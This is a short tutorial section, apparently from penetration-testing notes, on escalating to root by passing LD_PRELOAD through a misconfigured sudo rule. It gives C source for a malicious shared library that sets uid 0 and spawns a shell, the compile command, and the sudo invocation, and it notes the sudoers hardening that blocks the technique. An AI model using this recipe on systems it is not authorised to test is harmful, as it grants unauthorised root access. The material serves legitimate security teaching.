## LD_PRELOAD Hijacking

[LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) is a Linux environment variable that forces the dynamic linker to load a specified shared library before any other — including standard system libraries. If a user can pass this variable into a `sudo` execution, it's possible to inject arbitrary code that runs with root privileges.

### Prerequisites

`sudo -l` must show a binary executable without a password **and** the environment must not strip `LD_PRELOAD` (i.e. `env_keep` includes it, or `SETENV` is present):

```shell
sudo -l
```

### Write the malicious shared library

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // avoid infinite loop
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

`_init()` runs automatically when the library is loaded — before the actual binary starts.

### Compile as a shared object

```shell
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

### Execute via sudo with the preloaded library

```shell
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

The linker loads `root.so` first, `_init()` fires, drops privileges to root, and spawns a shell.

> 💡 This only works if `env_reset` in `/etc/sudoers` is overridden with `env_keep += LD_PRELOAD` or the sudo rule includes `SETENV`. Most hardened configs strip `LD_PRELOAD` on sudo execution precisely because of this attack.
